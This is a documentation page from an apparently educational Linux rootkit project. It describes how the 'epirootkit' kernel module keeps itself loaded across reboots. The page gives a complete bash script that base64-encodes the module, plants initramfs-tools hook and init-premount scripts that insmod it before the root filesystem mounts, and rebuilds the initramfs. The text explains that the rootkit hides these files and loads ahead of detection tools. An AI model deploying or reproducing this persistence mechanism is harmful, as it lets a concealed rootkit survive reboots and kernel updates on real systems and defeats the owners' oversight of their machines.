\page persist Persistence

\tableofcontents

To ensure the rootkit is automatically loaded at every system boot, we implemented a persistence mechanism based on integrating the module into the initramfs. This solution consists of packaging the rootkit binary file (.ko) within the *initramfs*, then inserting a small shell script that, during the kernel boot phase, performs the module insertion even before mounting the usual file systems. Once loaded, the module installs its *ftrace hooks* and hides its own components. Below, we describe in detail how this mechanism works: from the persistence script launched by the Makefile to the execution of module insertion at boot and its concealment.

## 1. 🛠️ Overview

The core of persistence is a single shell script, initrd.sh, located in the `scripts/romance` directory of the project. When a user executes the `sudo make` command and after compilation, the `Makefile` first encodes the rootkit .ko file in base64 to embed it in the `/lib/epirootkit/` directory on the root file system. It then calls the script to create two other specific scripts in the initramfs structure:

- A hook placed in `/etc/initramfs-tools/hooks/epirootkit` to copy the encoded file when generating the initramfs.Hook configurations are saved and automatically restored when the module is reinserted.

- A script in `/etc/initramfs-tools/scripts/init-premount/epirootkit-load` that will be executed just before mounting the root file system, to insert the module.

## Automatic Loading

```bash

#!/usr/bin/env bashThe rootkit can be configured to load automatically at system boot.

set -e

BLOB_SRC="/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv"

HOOK_DIR="/etc/initramfs-tools/hooks"
HOOK_PATH="$HOOK_DIR/epirootkit"
mkdir -p "$HOOK_DIR"
cat > "$HOOK_PATH" << 'EOF'
#!/bin/sh
set -e

PREREQ=""
prereqs() { echo "$PREREQ"; }
case "$1" in
  prereqs) prereqs && exit 0 ;;
esac

mkdir -p "${DESTDIR}/sbin"
ln -s /bin/kmod "${DESTDIR}/sbin/insmod"

mkdir -p "${DESTDIR}/lib/epirootkit"
install -m644 /lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv \
  "${DESTDIR}/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv"

base64 -d "${DESTDIR}/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv" \
  > "${DESTDIR}/lib/epirootkit/epirootkit.ko"
rm -f "${DESTDIR}/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv"
EOF

chmod +x "$HOOK_PATH"

LOAD_DIR="/etc/initramfs-tools/scripts/init-premount"
LOAD_PATH="$LOAD_DIR/epirootkit-load"
mkdir -p "$LOAD_DIR"
cat > "$LOAD_PATH" << 'EOF'
#!/bin/sh
/sbin/insmod /lib/epirootkit/epirootkit.ko 2> /tmp/insmod.err || true
EOF

chmod +x "$LOAD_PATH"

update-initramfs -u -k "$(uname -r)"
```

## 2. 🚀 Boot Process

### 2.1 Loading

The Linux kernel loads into memory the previously generated initramfs. The latter contains the epirootkit.ko module decrypted from the base64 file as well as the `hooks/epirootkit` and `scripts/init-premount/epirootkit-load` scripts. The `insmod` binary corresponding to a symbolic link to the `kmod` binary, but not being present by default in the initramfs, we manually create the symbolic link to make the command available.
```bash
ln -s /bin/kmod "${DESTDIR}/sbin/insmod"
```

### 2.2 Execution

Before mounting the root, the initramfs executes all scripts present in scripts/init-premount/. Our script simply calls `/sbin/insmod /lib/epirootkit/epirootkit.ko`. After loading the module, the initramfs completes its task, then exits its *rootfs initramfs* phase. The kernel then mounts the system root from the disk. At this stage, *epirootkit.ko* is already active, and the *ftrace* hooks will intercept all subsequent system calls, and can automatically hide the persistence scripts to prevent their detection, as well as the base64 module. Base64 mainly allows transforming the compiled module into plain text, for very minimal obfuscation.

## 3. 🔥 Advantages

Initially, we considered using the classic method to ensure reliable kernel module persistence: inserting it directly into the modules directory, accompanied by a `.conf` file in `/etc/modules-load.d/`. However, we wanted to explore another approach... What we particularly appreciated with this alternative method is that the module is inserted before mounting the root partition, i.e., at a time when most classic detection or protection mechanisms are not yet active. This allows hiding all components from boot before other modules.

> We also discovered many interesting techniques for future projects, notably on the excellent website [Elastic Security Labs](https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence).

Moreover, each time `update-initramfs` is executed, the initramfs is automatically regenerated and includes again our hook as well as our encoded module. This way, even in case of kernel update (via apt, aptitude, etc.), persistence is maintained: as long as the scripts in `/etc/initramfs-tools/` are not deleted, the module is reinjected at each boot, without manual reinstallation being necessary. However, this method only works if the distribution actually uses initramfs-tools. On other distributions, the logic would probably need to be adapted to the initramfs generation tool used...

<img 
  src="logo_no_text.png" 
  style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  "
/>
